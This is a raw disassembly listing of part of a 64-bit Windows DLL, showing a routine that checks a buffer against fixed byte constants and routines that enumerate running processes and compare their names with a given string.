   180003be8:	48 8d 0d 01 4b 05 00 	lea    0x54b01(%rip),%rcx        # 0x1800586f0
   180003bef:	e8 0c b7 00 00       	call   0x18000f300
   180003bf4:	33 d2                	xor    %edx,%edx
   180003bf6:	4c 8d 84 24 90 00 00 	lea    0x90(%rsp),%r8
   180003bfd:	00 
   180003bfe:	8b ca                	mov    %edx,%ecx
   180003c00:	4c 8d 0d 8d bd 04 00 	lea    0x4bd8d(%rip),%r9        # 0x18004f994
   180003c07:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180003c0e:	00 00 
   180003c10:	41 0f b6 04 08       	movzbl (%r8,%rcx,1),%eax
   180003c15:	48 ff c1             	inc    %rcx
   180003c18:	41 3a 44 09 ff       	cmp    -0x1(%r9,%rcx,1),%al
   180003c1d:	75 7a                	jne    0x180003c99
   180003c1f:	48 83 f9 06          	cmp    $0x6,%rcx
   180003c23:	75 eb                	jne    0x180003c10
   180003c25:	48 8d 8c 24 98 00 00 	lea    0x98(%rsp),%rcx
   180003c2c:	00 
   180003c2d:	4c 8d 05 68 bd 04 00 	lea    0x4bd68(%rip),%r8        # 0x18004f99c
   180003c34:	0f 1f 40 00          	nopl   0x0(%rax)
   180003c38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180003c3f:	00 
   180003c40:	0f b6 04 11          	movzbl (%rcx,%rdx,1),%eax
   180003c44:	48 ff c2             	inc    %rdx
   180003c47:	41 3a 44 10 ff       	cmp    -0x1(%r8,%rdx,1),%al
   180003c4c:	75 4b                	jne    0x180003c99
   180003c4e:	48 83 fa 07          	cmp    $0x7,%rdx
   180003c52:	75 ec                	jne    0x180003c40
   180003c54:	48 8d 15 4d bd 04 00 	lea    0x4bd4d(%rip),%rdx        # 0x18004f9a8
   180003c5b:	48 8d 0d 8e 4a 05 00 	lea    0x54a8e(%rip),%rcx        # 0x1800586f0
   180003c62:	e8 99 b6 00 00       	call   0x18000f300
   180003c67:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003c6c:	e8 cf e2 ff ff       	call   0x180001f40
   180003c71:	e8 f6 07 02 00       	call   0x18002446c
   180003c76:	33 c0                	xor    %eax,%eax
   180003c78:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
   180003c7f:	00 
   180003c80:	48 33 cc             	xor    %rsp,%rcx
   180003c83:	e8 88 3c 01 00       	call   0x180017910
   180003c88:	48 8b 9c 24 c0 00 00 	mov    0xc0(%rsp),%rbx
   180003c8f:	00 
   180003c90:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   180003c97:	5f                   	pop    %rdi
   180003c98:	c3                   	ret
   180003c99:	48 8d 15 28 bd 04 00 	lea    0x4bd28(%rip),%rdx        # 0x18004f9c8
   180003ca0:	48 8d 0d 49 4a 05 00 	lea    0x54a49(%rip),%rcx        # 0x1800586f0
   180003ca7:	e8 54 b6 00 00       	call   0x18000f300
   180003cac:	e8 bb 07 02 00       	call   0x18002446c
   180003cb1:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   180003cb6:	e8 4d 10 02 00       	call   0x180024d08
   180003cbb:	cc                   	int3
   180003cbc:	cc                   	int3
   180003cbd:	cc                   	int3
   180003cbe:	cc                   	int3
   180003cbf:	cc                   	int3
   180003cc0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180003cc5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180003cca:	57                   	push   %rdi
   180003ccb:	48 83 ec 20          	sub    $0x20,%rsp
   180003ccf:	48 83 79 18 10       	cmpq   $0x10,0x18(%rcx)
   180003cd4:	48 8b da             	mov    %rdx,%rbx
   180003cd7:	48 8b f9             	mov    %rcx,%rdi
   180003cda:	72 03                	jb     0x180003cdf
   180003cdc:	48 8b 09             	mov    (%rcx),%rcx
   180003cdf:	48 8d 15 02 bd 04 00 	lea    0x4bd02(%rip),%rdx        # 0x18004f9e8
   180003ce6:	e8 ed 10 02 00       	call   0x180024dd8
   180003ceb:	48 83 7b 18 10       	cmpq   $0x10,0x18(%rbx)
   180003cf0:	48 8b f0             	mov    %rax,%rsi
   180003cf3:	4c 8b c3             	mov    %rbx,%r8
   180003cf6:	72 03                	jb     0x180003cfb
   180003cf8:	4c 8b 03             	mov    (%rbx),%r8
   180003cfb:	48 8d 15 ea bc 04 00 	lea    0x4bcea(%rip),%rdx        # 0x18004f9ec
   180003d02:	48 8b ce             	mov    %rsi,%rcx
   180003d05:	e8 46 d5 ff ff       	call   0x180001250
   180003d0a:	48 8b ce             	mov    %rsi,%rcx
   180003d0d:	e8 56 11 02 00       	call   0x180024e68
   180003d12:	48 8b 57 18          	mov    0x18(%rdi),%rdx
   180003d16:	48 83 fa 10          	cmp    $0x10,%rdx
   180003d1a:	72 2c                	jb     0x180003d48
   180003d1c:	48 8b 0f             	mov    (%rdi),%rcx
   180003d1f:	48 ff c2             	inc    %rdx
   180003d22:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180003d29:	72 18                	jb     0x180003d43
   180003d2b:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180003d2f:	48 83 c2 27          	add    $0x27,%rdx
   180003d33:	49 2b c8             	sub    %r8,%rcx
   180003d36:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180003d3a:	48 83 f8 1f          	cmp    $0x1f,%rax
   180003d3e:	77 6e                	ja     0x180003dae
   180003d40:	49 8b c8             	mov    %r8,%rcx
   180003d43:	e8 e8 3b 01 00       	call   0x180017930
   180003d48:	33 f6                	xor    %esi,%esi
   180003d4a:	48 c7 47 18 0f 00 00 	movq   $0xf,0x18(%rdi)
   180003d51:	00 
   180003d52:	48 89 77 10          	mov    %rsi,0x10(%rdi)
   180003d56:	40 88 37             	mov    %sil,(%rdi)
   180003d59:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   180003d5d:	48 83 fa 10          	cmp    $0x10,%rdx
   180003d61:	72 2c                	jb     0x180003d8f
   180003d63:	48 8b 0b             	mov    (%rbx),%rcx
   180003d66:	48 ff c2             	inc    %rdx
   180003d69:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180003d70:	72 18                	jb     0x180003d8a
   180003d72:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180003d76:	48 83 c2 27          	add    $0x27,%rdx
   180003d7a:	49 2b c8             	sub    %r8,%rcx
   180003d7d:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180003d81:	48 83 f8 1f          	cmp    $0x1f,%rax
   180003d85:	77 27                	ja     0x180003dae
   180003d87:	49 8b c8             	mov    %r8,%rcx
   180003d8a:	e8 a1 3b 01 00       	call   0x180017930
   180003d8f:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   180003d93:	40 88 33             	mov    %sil,(%rbx)
   180003d96:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   180003d9b:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   180003da2:	00 
   180003da3:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003da8:	48 83 c4 20          	add    $0x20,%rsp
   180003dac:	5f                   	pop    %rdi
   180003dad:	c3                   	ret
   180003dae:	e8 4d c7 01 00       	call   0x180020500
   180003db3:	cc                   	int3
   180003db4:	cc                   	int3
   180003db5:	cc                   	int3
   180003db6:	cc                   	int3
   180003db7:	cc                   	int3
   180003db8:	cc                   	int3
   180003db9:	cc                   	int3
   180003dba:	cc                   	int3
   180003dbb:	cc                   	int3
   180003dbc:	cc                   	int3
   180003dbd:	cc                   	int3
   180003dbe:	cc                   	int3
   180003dbf:	cc                   	int3
   180003dc0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180003dc5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180003dca:	55                   	push   %rbp
   180003dcb:	57                   	push   %rdi
   180003dcc:	41 54                	push   %r12
   180003dce:	41 56                	push   %r14
   180003dd0:	41 57                	push   %r15
   180003dd2:	48 8d ac 24 40 fe ff 	lea    -0x1c0(%rsp),%rbp
   180003dd9:	ff 
   180003dda:	48 81 ec c0 02 00 00 	sub    $0x2c0,%rsp
   180003de1:	48 8b 05 70 32 05 00 	mov    0x53270(%rip),%rax        # 0x180057058
   180003de8:	48 33 c4             	xor    %rsp,%rax
   180003deb:	48 89 85 b0 01 00 00 	mov    %rax,0x1b0(%rbp)
   180003df2:	48 8b f1             	mov    %rcx,%rsi
   180003df5:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180003dfa:	45 32 ff             	xor    %r15b,%r15b
   180003dfd:	c7 44 24 70 38 02 00 	movl   $0x238,0x70(%rsp)
   180003e04:	00 
   180003e05:	33 d2                	xor    %edx,%edx
   180003e07:	8d 4a 02             	lea    0x2(%rdx),%ecx
   180003e0a:	ff 15 d0 c2 03 00    	call   *0x3c2d0(%rip)        # 0x1800400e0
   180003e10:	4c 8b f0             	mov    %rax,%r14
   180003e13:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180003e18:	48 8b c8             	mov    %rax,%rcx
   180003e1b:	ff 15 af c2 03 00    	call   *0x3c2af(%rip)        # 0x1800400d0
   180003e21:	45 33 e4             	xor    %r12d,%r12d
   180003e24:	83 f8 01             	cmp    $0x1,%eax
   180003e27:	0f 85 ce 02 00 00    	jne    0x1800040fb
   180003e2d:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180003e32:	49 8b ce             	mov    %r14,%rcx
   180003e35:	ff 15 8d c2 03 00    	call   *0x3c28d(%rip)        # 0x1800400c8
   180003e3b:	83 f8 01             	cmp    $0x1,%eax
   180003e3e:	0f 85 b7 02 00 00    	jne    0x1800040fb
   180003e44:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   180003e49:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003e4e:	66 90                	xchg   %ax,%ax
   180003e50:	4c 89 64 24 50       	mov    %r12,0x50(%rsp)
   180003e55:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   180003e5a:	48 c7 44 24 68 07 00 	movq   $0x7,0x68(%rsp)
   180003e61:	00 00 
   180003e63:	66 44 89 64 24 50    	mov    %r12w,0x50(%rsp)
   180003e69:	48 8d 45 9c          	lea    -0x64(%rbp),%rax
   180003e6d:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   180003e74:	48 ff c2             	inc    %rdx
   180003e77:	66 83 3c 50 00       	cmpw   $0x0,(%rax,%rdx,2)
   180003e7c:	75 f6                	jne    0x180003e74
   180003e7e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003e83:	48 83 fa 07          	cmp    $0x7,%rdx
   180003e87:	77 1d                	ja     0x180003ea6
   180003e89:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
   180003e8e:	48 8d 1c 12          	lea    (%rdx,%rdx,1),%rbx
   180003e92:	4c 8b c3             	mov    %rbx,%r8
   180003e95:	48 8d 55 9c          	lea    -0x64(%rbp),%rdx
   180003e99:	e8 02 5a 01 00       	call   0x1800198a0
   180003e9e:	66 44 89 64 1c 50    	mov    %r12w,0x50(%rsp,%rbx,1)
   180003ea4:	eb 0d                	jmp    0x180003eb3
   180003ea6:	4c 8d 4d 9c          	lea    -0x64(%rbp),%r9
   180003eaa:	45 33 c0             	xor    %r8d,%r8d
   180003ead:	e8 5e c4 00 00       	call   0x180010310
   180003eb2:	90                   	nop
   180003eb3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003eb8:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   180003ebd:	49 83 fb 08          	cmp    $0x8,%r11
   180003ec1:	41 0f 93 c0          	setae  %r8b
   180003ec5:	48 0f 43 54 24 50    	cmovae 0x50(%rsp),%rdx
   180003ecb:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   180003ed0:	48 8d 3c 42          	lea    (%rdx,%rax,2),%rdi
   180003ed4:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   180003ed9:	45 84 c0             	test   %r8b,%r8b
   180003edc:	48 0f 45 5c 24 50    	cmovne 0x50(%rsp),%rbx
   180003ee2:	4d 8b cc             	mov    %r12,%r9
   180003ee5:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   180003eea:	49 8b cc             	mov    %r12,%rcx
   180003eed:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180003ef2:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   180003ef8:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   180003efd:	48 8b d7             	mov    %rdi,%rdx
   180003f00:	48 2b d3             	sub    %rbx,%rdx
   180003f03:	48 d1 fa             	sar    $1,%rdx
   180003f06:	48 83 fa 10          	cmp    $0x10,%rdx
   180003f0a:	72 21                	jb     0x180003f2d
   180003f0c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003f11:	e8 2a 1e 01 00       	call   0x180015d40
   180003f16:	49 8b cc             	mov    %r12,%rcx
   180003f19:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   180003f1e:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   180003f23:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   180003f28:	4c 8b 4c 24 30       	mov    0x30(%rsp),%r9
   180003f2d:	48 3b df             	cmp    %rdi,%rbx
   180003f30:	74 5c                	je     0x180003f8e
   180003f32:	0f b6 13             	movzbl (%rbx),%edx
   180003f35:	49 3b c8             	cmp    %r8,%rcx
   180003f38:	73 20                	jae    0x180003f5a
   180003f3a:	48 8d 41 01          	lea    0x1(%rcx),%rax
   180003f3e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180003f43:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   180003f48:	49 83 f8 10          	cmp    $0x10,%r8
   180003f4c:	49 0f 43 c1          	cmovae %r9,%rax
   180003f50:	88 14 08             	mov    %dl,(%rax,%rcx,1)
   180003f53:	c6 44 08 01 00       	movb   $0x0,0x1(%rax,%rcx,1)
   180003f58:	eb 15                	jmp    0x180003f6f
   180003f5a:	44 0f b6 ca          	movzbl %dl,%r9d
   180003f5e:	45 33 c0             	xor    %r8d,%r8d
   180003f61:	41 8d 50 01          	lea    0x1(%r8),%edx
   180003f65:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003f6a:	e8 11 c5 00 00       	call   0x180010480
   180003f6f:	48 83 c3 02          	add    $0x2,%rbx
   180003f73:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   180003f78:	4c 8b 4c 24 30       	mov    0x30(%rsp),%r9
   180003f7d:	48 3b df             	cmp    %rdi,%rbx
   180003f80:	74 07                	je     0x180003f89
   180003f82:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   180003f87:	eb a9                	jmp    0x180003f32
   180003f89:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   180003f8e:	4c 8d 54 24 30       	lea    0x30(%rsp),%r10
   180003f93:	49 83 f8 10          	cmp    $0x10,%r8
   180003f97:	0f 93 c3             	setae  %bl
   180003f9a:	4d 0f 43 d1          	cmovae %r9,%r10
   180003f9e:	48 8b c6             	mov    %rsi,%rax
   180003fa1:	48 83 7e 18 10       	cmpq   $0x10,0x18(%rsi)
   180003fa6:	72 03                	jb     0x180003fab
   180003fa8:	48 8b 06             	mov    (%rsi),%rax
   180003fab:	4c 2b d0             	sub    %rax,%r10
   180003fae:	66 90                	xchg   %ax,%ax
   180003fb0:	0f b6 10             	movzbl (%rax),%edx
   180003fb3:	42 0f b6 0c 10       	movzbl (%rax,%r10,1),%ecx
   180003fb8:	2b d1                	sub    %ecx,%edx
   180003fba:	75 07                	jne    0x180003fc3
   180003fbc:	48 ff c0             	inc    %rax
   180003fbf:	85 c9                	test   %ecx,%ecx
   180003fc1:	75 ed                	jne    0x180003fb0
   180003fc3:	85 d2                	test   %edx,%edx
   180003fc5:	0f 84 a6 00 00 00    	je     0x180004071
   180003fcb:	84 db                	test   %bl,%bl
   180003fcd:	74 36                	je     0x180004005
   180003fcf:	49 8d 50 01          	lea    0x1(%r8),%rdx
   180003fd3:	49 8b c1             	mov    %r9,%rax
   180003fd6:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180003fdd:	72 19                	jb     0x180003ff8
   180003fdf:	48 83 c2 27          	add    $0x27,%rdx
   180003fe3:	4d 8b 49 f8          	mov    -0x8(%r9),%r9
   180003fe7:	49 2b c1             	sub    %r9,%rax
   180003fea:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180003fee:	48 83 f8 1f          	cmp    $0x1f,%rax
   180003ff2:	0f 87 83 01 00 00    	ja     0x18000417b
   180003ff8:	49 8b c9             	mov    %r9,%rcx
   180003ffb:	e8 30 39 01 00       	call   0x180017930
   180004000:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   180004005:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   18000400a:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   180004011:	00 00 
   180004013:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   180004018:	49 83 fb 08          	cmp    $0x8,%r11
   18000401c:	72 37                	jb     0x180004055
   18000401e:	4a 8d 14 5d 02 00 00 	lea    0x2(,%r11,2),%rdx
   180004025:	00 
   180004026:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   18000402b:	48 8b c1             	mov    %rcx,%rax
   18000402e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004035:	72 19                	jb     0x180004050
   180004037:	48 83 c2 27          	add    $0x27,%rdx
   18000403b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   18000403f:	48 2b c1             	sub    %rcx,%rax
   180004042:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004046:	48 83 f8 1f          	cmp    $0x1f,%rax
   18000404a:	0f 87 1f 01 00 00    	ja     0x18000416f
   180004050:	e8 db 38 01 00       	call   0x180017930
   180004055:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   18000405a:	49 8b ce             	mov    %r14,%rcx
   18000405d:	ff 15 65 c0 03 00    	call   *0x3c065(%rip)        # 0x1800400c8
   180004063:	83 f8 01             	cmp    $0x1,%eax
   180004066:	0f 84 e4 fd ff ff    	je     0x180003e50
   18000406c:	e9 8a 00 00 00       	jmp    0x1800040fb
   180004071:	41 b7 01             	mov    $0x1,%r15b
   180004074:	84 db                	test   %bl,%bl
   180004076:	74 36                	je     0x1800040ae
   180004078:	49 8d 50 01          	lea    0x1(%r8),%rdx
   18000407c:	49 8b c1             	mov    %r9,%rax
   18000407f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004086:	72 19                	jb     0x1800040a1
   180004088:	48 83 c2 27          	add    $0x27,%rdx
   18000408c:	4d 8b 49 f8          	mov    -0x8(%r9),%r9
   180004090:	49 2b c1             	sub    %r9,%rax
   180004093:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004097:	48 83 f8 1f          	cmp    $0x1f,%rax
   18000409b:	0f 87 da 00 00 00    	ja     0x18000417b
   1800040a1:	49 8b c9             	mov    %r9,%rcx
   1800040a4:	e8 87 38 01 00       	call   0x180017930
   1800040a9:	4c 8b 5c 24 68       	mov    0x68(%rsp),%r11
   1800040ae:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   1800040b3:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   1800040ba:	00 00 
   1800040bc:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   1800040c1:	49 83 fb 08          	cmp    $0x8,%r11
   1800040c5:	72 34                	jb     0x1800040fb
   1800040c7:	4a 8d 14 5d 02 00 00 	lea    0x2(,%r11,2),%rdx
   1800040ce:	00 
   1800040cf:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1800040d4:	48 8b c1             	mov    %rcx,%rax
   1800040d7:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800040de:	72 15                	jb     0x1800040f5
   1800040e0:	48 83 c2 27          	add    $0x27,%rdx
   1800040e4:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800040e8:	48 2b c1             	sub    %rcx,%rax
   1800040eb:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800040ef:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800040f3:	77 7a                	ja     0x18000416f
   1800040f5:	e8 36 38 01 00       	call   0x180017930
   1800040fa:	90                   	nop
   1800040fb:	48 8b 56 18          	mov    0x18(%rsi),%rdx
   1800040ff:	48 83 fa 10          	cmp    $0x10,%rdx
   180004103:	72 2c                	jb     0x180004131
   180004105:	48 ff c2             	inc    %rdx
   180004108:	48 8b 0e             	mov    (%rsi),%rcx
   18000410b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004112:	72 18                	jb     0x18000412c
   180004114:	48 83 c2 27          	add    $0x27,%rdx
   180004118:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   18000411c:	49 2b c8             	sub    %r8,%rcx
   18000411f:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180004123:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004127:	77 4c                	ja     0x180004175
   180004129:	49 8b c8             	mov    %r8,%rcx
   18000412c:	e8 ff 37 01 00       	call   0x180017930
   180004131:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   180004135:	48 c7 46 18 0f 00 00 	movq   $0xf,0x18(%rsi)
   18000413c:	00 
   18000413d:	c6 06 00             	movb   $0x0,(%rsi)
   180004140:	41 0f b6 c7          	movzbl %r15b,%eax
   180004144:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   18000414b:	48 33 cc             	xor    %rsp,%rcx
   18000414e:	e8 bd 37 01 00       	call   0x180017910
   180004153:	4c 8d 9c 24 c0 02 00 	lea    0x2c0(%rsp),%r11
   18000415a:	00 
   18000415b:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   18000415f:	49 8b 73 40          	mov    0x40(%r11),%rsi
   180004163:	49 8b e3             	mov    %r11,%rsp
   180004166:	41 5f                	pop    %r15
   180004168:	41 5e                	pop    %r14
   18000416a:	41 5c                	pop    %r12
   18000416c:	5f                   	pop    %rdi
   18000416d:	5d                   	pop    %rbp
   18000416e:	c3                   	ret
   18000416f:	e8 8c c3 01 00       	call   0x180020500
   180004174:	90                   	nop
   180004175:	e8 86 c3 01 00       	call   0x180020500
   18000417a:	90                   	nop
   18000417b:	e8 80 c3 01 00       	call   0x180020500
   180004180:	cc                   	int3
   180004181:	cc                   	int3
   180004182:	cc                   	int3
   180004183:	cc                   	int3
   180004184:	cc                   	int3
   180004185:	cc                   	int3
   180004186:	cc                   	int3
   180004187:	cc                   	int3
   180004188:	cc                   	int3
   180004189:	cc                   	int3
   18000418a:	cc                   	int3
   18000418b:	cc                   	int3
   18000418c:	cc                   	int3
   18000418d:	cc                   	int3
   18000418e:	cc                   	int3
   18000418f:	cc                   	int3
   180004190:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180004195:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000419a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000419f:	55                   	push   %rbp
   1800041a0:	41 54                	push   %r12
   1800041a2:	41 55                	push   %r13
   1800041a4:	41 56                	push   %r14
   1800041a6:	41 57                	push   %r15
   1800041a8:	48 8d ac 24 30 fe ff 	lea    -0x1d0(%rsp),%rbp
   1800041af:	ff 
   1800041b0:	48 81 ec d0 02 00 00 	sub    $0x2d0,%rsp
   1800041b7:	48 8b 05 9a 2e 05 00 	mov    0x52e9a(%rip),%rax        # 0x180057058
   1800041be:	48 33 c4             	xor    %rsp,%rax
   1800041c1:	48 89 85 c0 01 00 00 	mov    %rax,0x1c0(%rbp)
   1800041c8:	4c 8b e1             	mov    %rcx,%r12
   1800041cb:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   1800041d0:	c7 44 24 40 38 02 00 	movl   $0x238,0x40(%rsp)
   1800041d7:	00 
   1800041d8:	33 d2                	xor    %edx,%edx
   1800041da:	8d 4a 02             	lea    0x2(%rdx),%ecx
   1800041dd:	ff 15 fd be 03 00    	call   *0x3befd(%rip)        # 0x1800400e0
   1800041e3:	4c 8b e8             	mov    %rax,%r13
   1800041e6:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1800041eb:	48 8b c8             	mov    %rax,%rcx
   1800041ee:	ff 15 dc be 03 00    	call   *0x3bedc(%rip)        # 0x1800400d0
   1800041f4:	33 ff                	xor    %edi,%edi
   1800041f6:	83 f8 01             	cmp    $0x1,%eax
   1800041f9:	0f 85 47 03 00 00    	jne    0x180004546
   1800041ff:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180004204:	49 8b cd             	mov    %r13,%rcx
   180004207:	ff 15 bb be 03 00    	call   *0x3bebb(%rip)        # 0x1800400c8
   18000420d:	83 f8 01             	cmp    $0x1,%eax
   180004210:	0f 85 30 03 00 00    	jne    0x180004546
   180004216:	48 8d 85 80 01 00 00 	lea    0x180(%rbp),%rax
   18000421d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180004222:	48 89 bd a0 01 00 00 	mov    %rdi,0x1a0(%rbp)
   180004229:	48 89 bd b0 01 00 00 	mov    %rdi,0x1b0(%rbp)
   180004230:	48 c7 85 b8 01 00 00 	movq   $0x7,0x1b8(%rbp)
   180004237:	07 00 00 00 
   18000423b:	66 89 bd a0 01 00 00 	mov    %di,0x1a0(%rbp)
   180004242:	48 8d 44 24 6c       	lea    0x6c(%rsp),%rax
   180004247:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   18000424e:	66 90                	xchg   %ax,%ax
   180004250:	48 ff c2             	inc    %rdx
   180004253:	66 83 3c 50 00       	cmpw   $0x0,(%rax,%rdx,2)
   180004258:	75 f6                	jne    0x180004250
   18000425a:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   180004261:	48 83 fa 07          	cmp    $0x7,%rdx
   180004265:	77 22                	ja     0x180004289
   180004267:	48 89 95 b0 01 00 00 	mov    %rdx,0x1b0(%rbp)
   18000426e:	48 8d 1c 12          	lea    (%rdx,%rdx,1),%rbx
   180004272:	4c 8b c3             	mov    %rbx,%r8
   180004275:	48 8d 54 24 6c       	lea    0x6c(%rsp),%rdx
   18000427a:	e8 21 56 01 00       	call   0x1800198a0
   18000427f:	66 89 bc 1d a0 01 00 	mov    %di,0x1a0(%rbp,%rbx,1)
   180004286:	00 
   180004287:	eb 0e                	jmp    0x180004297
   180004289:	4c 8d 4c 24 6c       	lea    0x6c(%rsp),%r9
   18000428e:	45 33 c0             	xor    %r8d,%r8d
   180004291:	e8 7a c0 00 00       	call   0x180010310
   180004296:	90                   	nop
   180004297:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   18000429e:	4c 8b b5 b8 01 00 00 	mov    0x1b8(%rbp),%r14
   1800042a5:	49 83 fe 08          	cmp    $0x8,%r14
   1800042a9:	41 0f 93 c0          	setae  %r8b
   1800042ad:	48 0f 43 95 a0 01 00 	cmovae 0x1a0(%rbp),%rdx
   1800042b4:	00 
   1800042b5:	48 8b 85 b0 01 00 00 	mov    0x1b0(%rbp),%rax
   1800042bc:	4c 8d 3c 42          	lea    (%rdx,%rax,2),%r15
   1800042c0:	48 8d 9d a0 01 00 00 	lea    0x1a0(%rbp),%rbx
   1800042c7:	45 84 c0             	test   %r8b,%r8b
   1800042ca:	48 0f 45 9d a0 01 00 	cmovne 0x1a0(%rbp),%rbx
   1800042d1:	00 
   1800042d2:	48 8b f7             	mov    %rdi,%rsi
   1800042d5:	48 89 bd 80 01 00 00 	mov    %rdi,0x180(%rbp)
   1800042dc:	48 8b d7             	mov    %rdi,%rdx
   1800042df:	48 89 95 90 01 00 00 	mov    %rdx,0x190(%rbp)
   1800042e6:	bf 0f 00 00 00       	mov    $0xf,%edi
   1800042eb:	48 89 bd 98 01 00 00 	mov    %rdi,0x198(%rbp)
   1800042f2:	49 8b c7             	mov    %r15,%rax
   1800042f5:	48 2b c3             	sub    %rbx,%rax
   1800042f8:	48 d1 f8             	sar    $1,%rax
   1800042fb:	48 83 f8 10          	cmp    $0x10,%rax
   1800042ff:	72 2d                	jb     0x18000432e
   180004301:	48 8b d0             	mov    %rax,%rdx
   180004304:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   18000430b:	e8 30 1a 01 00       	call   0x180015d40
   180004310:	33 d2                	xor    %edx,%edx
   180004312:	48 89 95 90 01 00 00 	mov    %rdx,0x190(%rbp)
   180004319:	4c 8b b5 b8 01 00 00 	mov    0x1b8(%rbp),%r14
   180004320:	48 8b bd 98 01 00 00 	mov    0x198(%rbp),%rdi
   180004327:	48 8b b5 80 01 00 00 	mov    0x180(%rbp),%rsi
   18000432e:	49 3b df             	cmp    %r15,%rbx
   180004331:	74 66                	je     0x180004399
   180004333:	44 0f b6 0b          	movzbl (%rbx),%r9d
   180004337:	48 3b d7             	cmp    %rdi,%rdx
   18000433a:	73 25                	jae    0x180004361
   18000433c:	48 8d 42 01          	lea    0x1(%rdx),%rax
   180004340:	48 89 85 90 01 00 00 	mov    %rax,0x190(%rbp)
   180004347:	48 8d 85 80 01 00 00 	lea    0x180(%rbp),%rax
   18000434e:	48 83 ff 10          	cmp    $0x10,%rdi
   180004352:	48 0f 43 c6          	cmovae %rsi,%rax
   180004356:	44 88 0c 10          	mov    %r9b,(%rax,%rdx,1)
   18000435a:	c6 44 10 01 00       	movb   $0x0,0x1(%rax,%rdx,1)
   18000435f:	eb 13                	jmp    0x180004374
